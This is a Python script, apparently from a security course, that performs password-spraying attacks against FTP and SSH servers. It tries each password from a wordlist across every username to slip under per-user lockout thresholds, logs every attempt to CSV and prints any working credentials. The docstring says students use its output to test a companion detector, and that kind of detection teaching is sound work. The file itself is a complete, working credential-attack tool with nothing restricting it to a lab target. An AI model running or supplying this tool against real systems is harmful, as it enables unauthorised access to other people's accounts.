#!/usr/bin/env python3
"""Password spray attack demonstrator.

Spray pattern: try ONE password against ALL users, then move to the next
password.  This deliberately avoids per-user lockout thresholds — the opposite
of a credential-guessing attack (many passwords → one user).

The output CSV uses the same schema as gateway_probe.py so students can
compare the two files side-by-side and observe how detect_probe.py triggers
SPRAYING alerts instead of GUESSING alerts.

Usage examples
--------------
# FTP spray using a wordlist
python gateway_spray.py 10.0.0.1 --service ftp --userlist userlist.txt --wordlist wordlist.txt

# SSH spray with a single password
python gateway_spray.py 10.0.0.1 --service ssh --userlist userlist.txt --password "Password1"
"""

import argparse
import csv
import ftplib
import socket
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import paramiko

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _local_ip(target: str, port: int) -> str:
    """Return the local source IP used to reach target:port.

    Uses a UDP socket — no packet is actually sent.
    Falls back to 'unknown' if the host is unreachable.
    """
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target, port))
            return s.getsockname()[0]
    except OSError:
        return "unknown"


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------


def parse_arguments():
    """Define and parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Password spray: test one password against many users (FTP or SSH)"
    )
    parser.add_argument("target", help="Target IP address or hostname")
    parser.add_argument(
        "--service",
        choices=["ftp", "ssh"],
        required=True,
        help="Service to test: ftp or ssh",
    )
    parser.add_argument(
        "--userlist",
        required=True,
        type=Path,
        help="Path to a file containing usernames, one per line",
    )

    # Accept either a single password or a wordlist — not both.
    pw_group = parser.add_mutually_exclusive_group(required=True)
    pw_group.add_argument(
        "--password",
        help="Single password to spray across all users",
    )
    pw_group.add_argument(
        "--wordlist",
        type=Path,
        help="Path to a password wordlist (one password per line)",
    )

    parser.add_argument(
        "--port",
        type=int,
        default=None,
        help="Target port (default: 21 for FTP, 22 for SSH)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.1,
        help="Seconds to wait between attempts (default: 0.1)",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=Path("sp_attempts.csv"),
        help="Write attempt log to this CSV file (default: sp_attempts.csv)",
    )
    return parser.parse_args()


# ---------------------------------------------------------------------------
# File loaders
# ---------------------------------------------------------------------------


def load_lines(path: Path, label: str) -> list[str]:
    """Load non-empty stripped lines from a text file.

    Args:
        path:  Path to the file.
        label: Human-readable label used in error/status messages.

    Returns:
        List of non-empty strings.

    Raises:
        SystemExit: If the file does not exist.
    """
    if not path.exists():
        print(f"[!] ERROR: {label} file not found: {path}", file=sys.stderr)
        sys.exit(1)

    with path.open("r", encoding="utf-8", errors="ignore") as fh:
        lines = [line.strip() for line in fh if line.strip()]

    print(f"[*] Loaded {len(lines)} {label.lower()} entries from {path}")
    return lines


# ---------------------------------------------------------------------------
# Authentication functions (identical logic to gateway_probe.py)
# ---------------------------------------------------------------------------


def attempt_ftp(host: str, port: int, user: str, password: str) -> bool:
    """Attempt FTP login. Returns True only on success."""
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout=5)
        ftp.login(user, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except (ConnectionRefusedError, TimeoutError, OSError) as e:
        print(f"[!] Connection error: {e}", file=sys.stderr)
        return False


def attempt_ssh(host: str, port: int, user: str, password: str) -> bool:
    """Attempt SSH login. Returns True only on success."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host,
            port=port,
            username=user,
            password=password,
            allow_agent=False,
            look_for_keys=False,
            timeout=5,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    except (paramiko.SSHException, socket.error, OSError) as e:
        print(f"[!] SSH connection error: {e}", file=sys.stderr)
        return False
    finally:
        client.close()


# ---------------------------------------------------------------------------
# Core spray logic
# ---------------------------------------------------------------------------


def run_spray(
    host: str,
    port: int,
    users: list[str],
    passwords: list[str],
    attempt_fn,
    output_path: Path,
    delay: float,
) -> list[dict]:
    """Spray each password across every user before moving to the next password.

    This is the defining characteristic of a spray attack:
        for password in passwords:
            for user in users:
                attempt(user, password)

    Returns a list of dicts describing every successful hit.
    """
    source = _local_ip(host, port)
    hits: list[dict] = []

    write_header = not output_path.exists() or output_path.stat().st_size == 0
    csv_file = output_path.open("a", newline="", encoding="utf-8")
    writer = csv.DictWriter(
        csv_file,
        fieldnames=["timestamp", "user", "password", "result", "source"],
    )
    if write_header:
        writer.writeheader()

    total_attempts = len(passwords) * len(users)
    attempt_num = 0

    try:
        for password in passwords:
            print(f"\n[*] --- Spraying password: {password!r} ---")
            for user in users:
                attempt_num += 1
                print(f"    [{attempt_num}/{total_attempts}] {user}:{password}")

                success = attempt_fn(host, port, user, password)
                result = "SUCCESS" if success else "FAIL"

                writer.writerow(
                    {
                        "timestamp": datetime.now(timezone.utc).strftime(
                            "%Y-%m-%dT%H:%M:%S"
                        ),
                        "user": user,
                        "password": password,
                        "result": result,
                        "source": source,
                    }
                )
                csv_file.flush()

                if success:
                    hits.append({"user": user, "password": password})
                    print(f"    [+] HIT: {user}:{password}")

                time.sleep(delay)
    finally:
        csv_file.close()

    return hits


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


def main() -> None:
    """Parse arguments, load inputs, run the spray, report results."""
    args = parse_arguments()

    if args.port is None:
        args.port = 21 if args.service == "ftp" else 22

    users = load_lines(args.userlist, "Users")

    if args.password:
        passwords = [args.password]
        print(f"[*] Loaded 1 password (single --password flag)")
    else:
        passwords = load_lines(args.wordlist, "Passwords")

    if not users:
        print("[!] User list is empty after cleaning.", file=sys.stderr)
        sys.exit(1)
    if not passwords:
        print("[!] Password list is empty after cleaning.", file=sys.stderr)
        sys.exit(1)

    attempt_fn = attempt_ftp if args.service == "ftp" else attempt_ssh

    print(f"\n[*] Target:      {args.target}:{args.port}")
    print(f"[*] Service:     {args.service.upper()}")
    print(f"[*] Users:       {len(users)}")
    print(f"[*] Passwords:   {len(passwords)}")
    print(f"[*] Total tries: {len(users) * len(passwords)}")
    print(f"[*] Output:      {args.output}")
    print(f"[*] Delay:       {args.delay}s between attempts")
    print()

    hits = run_spray(
        args.target,
        args.port,
        users,
        passwords,
        attempt_fn,
        args.output,
        args.delay,
    )

    print("\n" + "=" * 50)
    if hits:
        print(f"[+] Spray complete — {len(hits)} credential(s) found:")
        for h in hits:
            print(f"    {h['user']}:{h['password']}")
    else:
        print("[-] Spray complete — no valid credentials found.")
    print(f"[*] Full log written to: {args.output}")


if __name__ == "__main__":
    main()
